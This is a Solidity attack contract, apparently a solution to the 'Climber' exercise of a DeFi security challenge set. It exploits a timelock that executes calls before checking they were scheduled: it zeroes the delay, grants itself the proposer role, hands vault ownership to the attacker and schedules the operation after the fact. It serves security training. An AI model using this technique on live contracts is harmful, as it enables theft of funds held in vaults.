// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "../climber/ClimberTimelock.sol";

contract ClimberAttack {
    address token;
    address timelock;
    address vault;
    address[] targets;
    uint256[] values;
    bytes[] dataElements;
    bytes32 salt = keccak256("salt");

    constructor(
        address _timelock,
        address _vault
    ) {
        timelock = _timelock;
        vault = _vault;
    }

    function attack() public {
        // set delay to 0 for allow scheduling this [excute operation] after excute happen
        targets.push(timelock);
        values.push(0);
        dataElements.push(
            abi.encodeWithSignature("updateDelay(uint64)", uint64(0))
        );

        // set PROPOSER_ROLE to this contract for executing schedule function
        targets.push(timelock);
        values.push(0);
        dataElements.push(
            abi.encodeWithSignature(
                "grantRole(bytes32,address)",
                keccak256("PROPOSER_ROLE"),
                address(this)
            )
        );

        // transfer ownership of vault to attacker
        targets.push(vault);
        values.push(0);
        dataElements.push(
            abi.encodeWithSignature("transferOwnership(address)", msg.sender)
        );

        // schedule this [excute operation] after excute happen, should be the last step because should keep excute and schedule operation args consistent
        targets.push(address(this));
        values.push(0);
        dataElements.push(abi.encodeWithSignature("schedule()"));

        ClimberTimelock(payable(timelock)).execute(
            targets,
            values,
            dataElements,
            salt
        );
    }

    function schedule() external {
        ClimberTimelock(payable(timelock)).schedule(
            targets,
            values,
            dataElements,
            salt
        );
    }
}
